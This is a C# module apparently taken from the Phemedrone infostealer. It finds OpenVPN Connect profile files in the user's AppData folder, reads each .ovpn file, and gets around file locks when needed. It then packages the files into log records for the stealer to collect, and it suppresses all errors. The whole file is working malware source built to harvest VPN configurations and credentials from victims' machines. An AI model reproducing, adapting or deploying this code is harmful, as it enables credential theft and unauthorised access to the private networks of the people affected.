using System;
using System.Collections.Generic;
using System.IO;
using Phemedrone;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace PhemedroneStealer.Services.VPN;

public class OpenVpn : IService
{
    public override PriorityLevel Priority => PriorityLevel.Medium;
    protected override string GetServiceName() => "OpenVPN";

    protected override LogRecord[] Collect()
    {
        var array = new List<LogRecord>();

        var vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "OpenVPN Connect", "profiles");

        if (!Directory.Exists(vpn)) return array.ToArray();

        try
        {

            foreach (var file in Directory.GetFiles(vpn))
            {
                if (!Path.GetExtension(file).Contains("ovpn")) continue;
                
                var filename = Path.GetFileName(file);
                
                var content = NullableValue.Call(() => File.ReadAllBytes(file));
                if (content == null)
                {
                    content = LockHelper.ReadFile(file);
                    
                    if (content == null) continue;
                }
                
                array.Add(new LogRecord
                {
                    Path = "VPN/OpenVpn/" + filename,
                    Content = content
                });
            }
        }
        catch
        {
            // ignored
        }

        return array.ToArray();
    }
}